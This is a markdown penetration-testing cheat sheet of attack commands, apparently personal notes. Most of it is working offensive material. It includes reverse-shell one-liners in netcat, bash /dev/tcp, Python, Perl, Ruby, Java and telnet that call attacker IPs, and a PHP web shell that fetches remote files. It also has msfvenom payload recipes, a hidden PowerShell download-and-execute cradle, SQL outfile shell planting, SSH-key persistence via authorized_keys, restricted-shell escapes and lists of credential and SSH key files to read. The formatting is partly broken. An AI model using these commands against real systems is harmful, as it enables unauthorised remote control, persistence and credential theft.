# SHELLS

# Reverse Shells

## netcat (nc)


-  with the -e option
```
nc -e /bin/sh 10.0.0.1 1234
```
-  without -e option (If you have the wrong version of netcat installed)
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.245 443 >/tmp/f
```

-  If the -e option is disabled, try this

```
mknod backpipe p && nc 10.11.0.245 443 0<backpipe | /bin/bash 1>backpipe /bin/sh | nc 10.11.0.245 443

rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4443 0/tmp/
```

## PHP

### PHP Shell
- We can create a new file say ( shell.php ) on the server containing
```
                   <?php system($\_GET["cmd"]); ?>
```

which can be accessed by
```
                   - http://IP/shell.php?cmd=id
```
If there’s a webpage which accepts phpcode to be executed, we can use curl to urlencode the payload and run it.
```
 curl -G -s http://10.X.X.X/somepage.php?data= --data-urlencode "html=<?php passthru('ls -lah'); ?>" -b "somecookie=somevalue" | sed '/<html>/,/<\/html>/d'
```

```
-G When used, this option will make all data specified with -d, --data, --data-binary or --data-urlencode to be used in an HTTP GET request instead of the POST request that otherwise would be used. The data will be appended to the URL with a  '?' separator.

-data-urlencode <data> (HTTP) This posts data, similar to the other -d, --data options with the exception that this performs URL-encoding.

-b, --cookie <data> (HTTP) Pass the data to the HTTP server in the Cookie header. It is supposedly the data previously received from the server in a "Set-Cookie:" line.  The data should be in the format "NAME1=VALUE1; NAME2=VALUE2".
```
- If you also want to provide upload functionality (Imagine, if we need to upload nc64.exe on Windows or other-binaries on linux), we can put the below code in the php file

```
<?php
 if (isset($_REQUEST['fupload'])) {
  file_put_contents($_REQUEST['fupload'], file_get_contents("http://yourIP/" . $_REQUEST['fupload']));
 };
 if (isset($_REQUEST['cmd'])) {
  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
 }
?>
```
### * **PHP Meterpreter**
- We can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.
```
                   - msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o /tmp/payload.php
                   ```
### * **PHP Reverse Shell**
                - TIP:   This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6
                ```
                   - php -r '$sock=fsockopen("192.168.56.101",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
                - The above can be connected by listening at port 1337 by using nc
                ```
### Weevely

```
            - Weevely also generates a webshell
               - weevely generate password /tmp/payload.php
            - which can be called by
               - weevely http://192.168.1.2/location_of_payload password
            - However, it wasn't as useful as php meterpreter or reverse shell.
            ```
### Ruby
```
            - Code:
               - ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
               ```
### Perl
```
               - perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
### Python
```
               - python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
### Java
```
               r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
### JSP
```
               - msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f war > runme.war
```
### Bash /dev/tcp

- If a server is listening on a port:
            ```
               - nc -lvp port
               ```
-  then we can use the below to connect
```
                - Method 1:
                   - /bin/bash -i >&/dev/tcp/10.11.0.245/443 0>&1
                - Method 2:
                   - exec 5<>/dev/tcp/IP/80
                   ```
                   ```
- cat <&5 | while read line; do $line 2>&5 >&5; done
                - # or:
                   - while read line 0<&5; do $line 2>&5 >&5; done
                - Method 3:
                   0<&196;exec 196<>/dev/tcp/IP/Port; sh <&196 >&196 2>&196
```
-- We may execute the above using bash -c "Aboveline "
### ## Information about Bash Built-in /dev/tcp File (TCP/IP) - CHECK DIT KOMENDE, een CHILD VAN hierboven is
                    - http://www.linuxjournal.com/content/more-using-bashs-built-devtcp-file-tcpip
### ## The following script fetches the front page from Google:
```
                   exec 3<>/dev/tcp/www.google.com/80
echo -e "GET / HTTP/1.1\r\nhost: http://www.google.com\r\nConnection: close\r\n\r\n" >&3
cat <&3
```
The first line causes file descriptor 3 to be opened for reading and writing on the specified TCP/IP socket. This is a special form of the exec statement. From the bash man page:
                       - exec [-cl] [-a name] [command [arguments]]
                        - If command is not specified, any redirections take effect in the current shell, and the return status is 0. So using exec without a command is a way to open files in the current shell.
Second line: After the socket is open we send our HTTP request out the socket with the echo … >&3 command. The request consists of:
                       GET / HTTP/1.1
host: http://www.google.com
Connection: close
                        - Each line is followed by a carriage-return and newline, and all the headers are followed by a blank line to signal the end of the request (this is all standard HTTP stuff).
                    - Third line: Next we read the response out of the socket using cat <&3, which reads the response and prints it out.
### Telnet Reverse Shell
           If netcat is not available or /dev/tcp
           ```
            - Code:
               rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
               ```

telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
### XTerm
            - One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.
               xterm -display 10.0.0.1:1
            - To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):
               - Xnest :1
            - You’ll need to authorise the target to connect to you (command also run on your host):
               - xhost +targetip
### Lynx
            - Obtain an interactive shell through lynx: It is possible to obtain an interactive shell via special LYNXDOWNLOAD URLs. This is a big security hole for sites that use lynx "guest accounts" and other public services. More details `LynxShell <http://insecure.org/sploits/lynx.download.html>`_
            - When you start up a lynx client session, you can hit "g" (for Goto) and then enter the following URL:
               - URL to open: LYNXDOWNLOAD://Method=-1/File=/dev/null;/bin/sh;/SugFile=/dev/null
### MYSQL
  -  If we have MYSQL Shell via sqlmap or phpmyadmin, we can use mysql outfile/ dumpfile function to upload a shell.
```
echo -n "<?php phpinfo(); ?>" | xxd -ps 3c3f70687020706870696e666f28293b203f3e
select 0x3c3f70687020706870696e666f28293b203f3e into outfile "/var/www/html/blogblog/wp-content/uploads/phpinfo.php"
```
 or
```
 - SELECT "<?php passthru($_GET['cmd']); ?>" into dumpfile '/var/www/html/shell.php';
```
 If you have sql-shell from sqlmap/ phpmyadmin, we can use
 ```
               - select load_file('/etc/passwd');
```


# Reverse Shell from Windows
##### If there’s a way, we can execute code from windows, we may try
                - Powershell Empire/ Metasploit Web-Delivery Method
###  Invoke-Shellcode (from powersploit)
                    - Code:
                       Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://YourIPAddress:8000/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost YourIPAddress -Lport 4444 -Force"
## - Upload ncat and execute
### with nc:
### Windows reverse shell
                    - c:>nc -Lp 31337 -vv -e cmd.exe nc 192.168.0.10 31337
                    - c:>nc example.com 80 -e cmd.exe nc -lp 80
                    - nc -lp 31337 -e /bin/bash
                    - nc 192.168.0.10 31337
                    - nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000
### MSF Meterpreter ELF

               - msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -o met LHOST=10.10.XX.110 LPORT=4446
## Metasploit MSFVenom

##### Ever wondered from where the above shells came from? Maybe try msfvenom and grep for cmd/unix
               msfvenom -l payloads | grep "cmd/unix"

```               
**snip**
   cmd/unix/bind_awk                                   Listen for a connection and spawn a command shell via GNU AWK
   cmd/unix/bind_inetd                                 Listen for a connection and spawn a command shell (persistent)
   cmd/unix/bind_lua                                   Listen for a connection and spawn a command shell via Lua
   cmd/unix/bind_netcat                                Listen for a connection and spawn a command shell via netcat
   cmd/unix/bind_perl                                  Listen for a connection and spawn a command shell via perl
   cmd/unix/interact                                   Interacts with a shell on an established socket connection
   cmd/unix/reverse                                    Creates an interactive shell through two inbound connections
   cmd/unix/reverse_awk                                Creates an interactive shell via GNU AWK
   cmd/unix/reverse_python                             Connect back and create a command shell via Python
   cmd/unix/reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.
   cmd/unix/reverse_r                                  Connect back and create a command shell via R
   cmd/unix/reverse_ruby                               Connect back and create a command shell via Ruby
**snip**
```
- Now, try to check the payload
```
                   msfvenom -p cmd/unix/bind_netcat

                          Payload size: 105 bytes

                          mkfifo /tmp/cdniov; (nc -l -p 4444 ||nc -l 4444)0</tmp/cdniov | /bin/sh >/tmp/cdniov 2>&1; rm /tmp/cdniov
                   ```


### MSF Linux Reverse Meterpreter Binary
                - msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -f elf -a x86 --platform linux -o shell
### MSF Reverse Shell (C Shellcode)
                - msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b "\x00\x0a\x0d" -a x86 --platform win -f c
### MSF Reverse Shell Python Script
                - msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py
### MSF Reverse ASP Shell
                - msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp -a x86 --platform win -o shell.asp
### MSF Reverse Bash Shell
                - msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.sh
### MSF Reverse PHP Shell
                - msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.php add <?php at the beginning
                - perl -i~ -0777pe's/^/<?php \n/' shell.php
### MSF Reverse Win Bin
                - msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe -a x86 --platform win -o shell.exe
            -
###references/articles:
            - Reverse shells one-liners
http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html
# Spawning a TTY Shell
        - About:
           Once we have reverse shell, we need a full TTY session by using either Python, sh, perl, ruby, lua, IRB. Spawning a TTY Shell and Post-Exploitation Without A TTY has provided multiple ways to get a tty shell
### Python
               python -c 'import pty; pty.spawn("/bin/sh")'
            - or
               ls
            - or
               - python -c 'import os; os.system("/bin/bash")'
### sh
               - /bin/sh -i
### Perl
               perl -e 'exec "/bin/sh";'
or
- perl: exec "/bin/sh";
### Ruby
            - .. code-block :: bash
            - ruby: exec "/bin/sh"
### Lua
            - .. code-block :: bash
            - lua: os.execute('/bin/sh')
### IRB
            - ^^^
            - (From within IRB)
            - .. code-block :: bash
            - exec "/bin/sh"
            -
### VI
            - (From within vi)
               - :!bash
            - (From within vi)
               :set shell=/bin/bash:shell
            - Also, if we execute
               vi ;/bin/bash
            - Once, we exit vi, we would get shell. Helpful in scenarios where the user is asked to input which file to open.
### Nmap
            - (From within nmap)
               - !sh
### Expect
            - Using “Expect” To Get A TTY
               $ cat sh.exp
```
#!/usr/bin/expect
```
 Spawn a shell, then allow the user to interact with it.
 The new shell will have a good enough TTY to run tools like ssh, su and login
spawn sh
interact
###  Stealthy SU in (Web) Shells
            - Let's say we have a webshell on the server ( probably, we would be logged in as a apache user), however, if we have credentials of another user, and we want to login we need a tty shell. We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell.
            - **Example**
            - Webshell like
               - http://IP/shell.php?cmd=id
            - If we try
               - echo password | su -c whoami
            - Probably will get
               - standard in must be a tty
            - The su command would work from a terminal, however, would not take in raw stuff via the shell's Standard Input.
            - We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell
               (sleep 1; echo password) | python -c "import pty; pty.spawn(['/bin/su','-c','whoami']);"
                root
            - The above has been referenced from SANS `Sneaky Stealthy SU in (Web) Shells <https://pen-testing.sans.org/blog/2014/07/08/sneaky-stealthy-su-in-web-shells#>`_



## Spawning a Fully Interactive TTYs Shell
        - Note:
           Ronnie Flathers has already written a great blog on Upgrading simple shells to fully interactive TTYs Hence, almost everything is taken from that blog and kept here for completion purposes.
### Many times, we will not get a fully interactive shell therefore it will/ have:
            - Difficult to use the text editors like vim
            - No tab-complete
            - No up arrow history
            - No job control
### Socat
           - Socat can be used to pass full TTY’s over TCP connections.
            - On Kali-Machine (Attackers - Probably yours)
               - socat file:`tty`,raw,echo=0 tcp-listen:4444
            - On Victim (launch):
               - socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
### If socat isn’t installed, download standalone binaries that can be downloaded from static binaries
                - Download the correct binary architecture of socat to a writable directory, chmod it, execute
### stty
            - Use the methods mentioned in Spawning a TTY Shell
##### Once bash is running in the PTY, background the shell with Ctrl-Z While the shell is in the background, examine the current terminal and STTY info so we can force the connected shell to match it
like this:

```
echo $TERM
xterm-256color
stty -a
speed 38400 baud; rows 59; columns 264; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V;   discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
- The information needed is the TERM type (“xterm-256color”) and the size of the current TTY (“rows 38; columns 116”)
- With the shell still backgrounded, set the current STTY to type raw and tell it to echo the input characters with the following command:
- stty raw -echo
- With a raw stty, input/output will look weird and you won’t see the next commands, but as you type they are being processed.
- Next foreground the shell with fg. It will re-open the reverse shell but formatting will be off. Finally, reinitialize the terminal with reset.
- After the reset the shell should look normal again. The last step is to set the shell, terminal type and stty size to match our current Kali window (from the info gathered above)
$ export SHELL=bash
$ export TERM=xterm256-color
$ stty rows 38 columns 116
- The end result is a fully interactive TTY with all the features we’d expect (tab-complete, history, job control, etc) all over a netcat connection
```



## ssh-key
##### If we have some user shell or access, probably it would be a good idea to generate a new ssh private-public key pair using ssh-keygen
Code:

```
ssh-keygen
```

```
Generating public/private rsa key pair.
Enter file in which to save the key (/home/bitvijays/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/bitvijays/.ssh/id_rsa.
Your public key has been saved in /home/bitvijays/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:JbdAhAIPl8qm/kCANJcpggeVoZqWnFRvVbxu2u9zc5U bitvijays@Kali-Home
The key's randomart image is:
+---[RSA 2048]----+
|o==*+. +=.       |
|=o**+ o. .       |
|=+...+  o +      |
|=.* .    * .     |
|oO      S .     .|
|+        o     E.|
|..      +       .|
| ..    . . . o . |
|  ..      ooo o  |
+----[SHA256]-----+
```
Copy/ Append the public part to /home/user/.ssh/authorized_keys
```
cat /home/bitvijays/.ssh/id_rsa.pub
```

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+tbCpnhU5qQm6typWI52FCin6NDYP0hmQFfag2kDwMDIS0j1ke/kuxfqfQKlbva9eo6IUaCrjIuAqbsZTsVjyFfjzo/hDKycR1M5/115Jx4q4v48a7BNnuUqi +qzUFjldFzfuTp6XM1n+Y1B6tQJJc9WruOFUNK2EX6pmOIkJ8QPTvMXYaxwol84MRb89V9vHCbfDrbWFhoA6hzeQVtI01ThMpQQqGv5LS+rI0GVlZnT8cUye0uiGZW7ek9DdcTEDtMUv1Y99zivk4FJmQWLzxplP5dUJ1NH5rm6YBH8CoQHLextWc36Ih18xsyzW8qK4Bfl4sOtESHT5/3PlkQHN bitvijays@Kali-Home" >> /home/user/.ssh/authorized_keys
```
Now, ssh to the box using that user.

```
- ssh user@hostname -i id_rsa
```



# Restricted Shell
        - Intro:
           Sometimes, after getting a shell, we figure out that we are in restricted shell. The below has been taken from Escaping Restricted Linux Shells, Escape from SHELLcatraz
### Definition
           It limits a user’s ability and only allows them to perform a subset of system commands. Typically, a combination of some or all of the following restrictions are imposed by a restricted shell:
            - Using the ‘cd’ command to change directories.
            - Setting or un-setting certain environment variables (i.e. SHELL, PATH, etc…).
            - Specifying command names that contain slashes.
            - Specifying a filename containing a slash as an argument to the ‘.’ built-in command.
            - Specifying a filename containing a slash as an argument to the ‘-p’ option to the ‘hash’ built-in command.
            - Importing function definitions from the shell environment at startup.
            - Parsing the value of SHELLOPTS from the shell environment at startup.
            - Redirecting output using the ‘>’, ‘>|’, “, ‘>&’, ‘&>’, and ‘>>’ redirection operators.
            - Using the ‘exec’ built-in to replace the shell with another command.
            - Adding or deleting built-in commands with the ‘-f’ and ‘-d’ options to the enable built-in.
            - Using the ‘enable’ built-in command to enable disabled shell built-ins.
            - Specifying the ‘-p’ option to the ‘command’ built-in.
            - Turning off restricted mode with ‘set +r’ or ‘set +o restricted
### Real shell implements restricted shells:
            - rbash
               bash -r
cd
bash: cd: restricted
            - rsh
            - rksh
### Getting out of restricted shell
#### Reconnaissance
#### Find out information about the environment.
                    - Run env to see exported environment variables
     Run ‘export -p’ to see the exported variables in the shell. This would tell which variables are read-only. Most likely the PATH ($PATH) and SHELL ($SHELL) variables are ‘-rx’, which means we can execute them, but not write to them. If they are writeable, we would be able to escape the restricted shell!:
                        - If the SHELL variable is writeable, you can simply set it to your shell of choice (i.e. sh, bash, ksh, etc…).
                        - If the PATH is writeable, then you’ll be able to set it to any directory you want. I recommend setting it to one that has commands vulnerable to shell escapes.
                    - Try basic Unix commands and see what’s allowed ls, pwd, cd, env, set, export, vi, cp, mv etc.
### Quick Wins
                    - If ‘/’ is allowed in commands just run /bin/sh
                    - If we can set PATH or SHELL variable
                       export PATH=/bin:/usr/bin:/sbin:$PATH
                    - export SHELL=/bin/sh
                    - or if chsh command is present just change the shell to /bin/bash
                       chsh
                    - password: <password will be asked>
                    - /bin/bash
                    - If we can copy files into existing PATH, copy
                       cp /bin/sh /current/directory; sh
#### Taking help of binaries
#### ## Some commands let us execute other system commands, often bypassing shell restrictions
```

                    - ftp -> !/bin/sh
                    - gdb -> !/bin/sh
                    - more/ less/ man -> !/bin/sh
                    - vi -> :!/bin/sh : Refer Breaking out of Jail : Restricted Shell and Restricted Accounts and Vim Tricks in Linux and Unix
                    - scp -S /tmp/getMeOut.sh x y : Refer Breaking out of rbash using scp
                    - awk ‘BEGIN {system(“/bin/sh”)}’
                    - find / -name someName -exec /bin/sh ;
                    - tee
                       - echo "Your evil code" | tee script.sh
   ```

###  Invoke shell thru scripting language

```
- Python
                           - python -c 'import os; os.system("/bin/bash")
- Perl
                           - perl -e 'exec "/bin/sh";'
                           ```

#### SSHing from outside

Use SSH on your machine to execute commands before the remote shell is loaded:
```
- ssh username@IP -t "/bin/sh"
                   ```
Start the remote shell without loading “rc” profile (where most of the limitations are often configured)
```
 - ssh username@IP -t "bash --noprofile"
                   ```

#### Getting out of rvim
```

                - Main difference of rvim vs vim is that rvim does not allow escape to shell with previously described techniques and, on top of that, no shell commands at all. Taken from vimjail
                ```

####  To list all installed features it is possible to use ‘:version’ vim command:
```

                    - Code:
                       :version

                       ```

Examining installed features and figure out which interpreter is installed.

If python/ python3 has been installed
```
 :python3 import pty;pty.spawn("/bin/bash")
```

### Article:
``` http://securebean.blogspot.nl/2014/05/escaping-restricted-shell_3.html
```
##Gather information from files
###In case of LFI or unprivileged shell, gathering information could be very useful.
```

** Mostly taken from `g0tmi1k Linux Privilege Escalation Blog <https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>`_
```

### Operating System
Code:
```
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release         # Debian based
cat /etc/redhat-release    # Redhat based
```
#### /Proc Variables

Code:

```
- /proc/sched_debug      This is usually enabled on newer systems, such as RHEL 6.  It provides information as to what process is running on which cpu.  This can be handy to get a list of processes and their PID number.

- /proc/net/arp          Shows the ARP table.  This is one way to find out IP addresses for other internal servers.

- /proc/net/route        Shows the routing table information.

- /proc/net/tcp

- /proc/net/udp          Provides a list of active connections.  Can be used to determine what ports are listening on the server

- /proc/net/fib_trie     This is used for route caching.  This can also be used to determine local IPs, as well as gain a better understanding of the target's networking structure

- /proc/version          Shows the kernel version.  This can be used to help determine the OS running and the last time it's been fully updated.


####  Each process also has its own set of attributes. If we have the PID number and access to that process, then we can obtain some useful information about it, such as its environmental variables and any command line options that were run. Sometimes these include passwords. Linux also has a special proc directory called self which can be used to query information about the current process without having to know it’s PID.

- /proc/[PID]/cmdline    Lists everything that was used to invoke the process. This sometimes contains useful paths to configuration files as well as usernames and passwords.

- /proc/[PID]/environ    Lists all the environment variables that were set when the process was invoked.  This also sometimes contains useful paths to configuration files as well as usernames and passwords.

- /proc/[PID]/cwd        Points to the current working directory of the process.  This may be useful if you don't know the absolute path to a configuration file.

- /proc/[PID]/fd/[#]     Provides access to the file descriptors being used.  In some cases this can be used to read files that are opened by a process.
```

####  The information about Proc variables has been taken from “Directory Traversal, File Inclusion, and The Proc File System”
```
- https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/
```

### Environment Variables
```
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
```
### Configuration Files
- Apache Web Server : Helps in figuring out the DocumentRoot where does your webserver files are?
```
- /etc/apache2/apache2.conf
- /etc/apache2/sites-enabled/000-default
```

### User History
```
- ~/.bash_history
- ~/.nano_history
- ~/.atftp_history
- ~/.mysql_history
- ~/.php_history
- ~/.viminfo
```

### Private SSH Keys / SSH Configuration
```

- ~/.ssh/authorized_keys : specifies the SSH keys that can be used for logging into the user account
- ~/.ssh/identity.pub
- ~/.ssh/identity
- ~/.ssh/id_rsa.pub
- ~/.ssh/id_rsa
- ~/.ssh/id_dsa.pub
- ~/.ssh/id_dsa
- /etc/ssh/ssh_config  : OpenSSH SSH client configuration files
- /etc/ssh/sshd_config : OpenSSH SSH daemon configuration file

```

## *References:
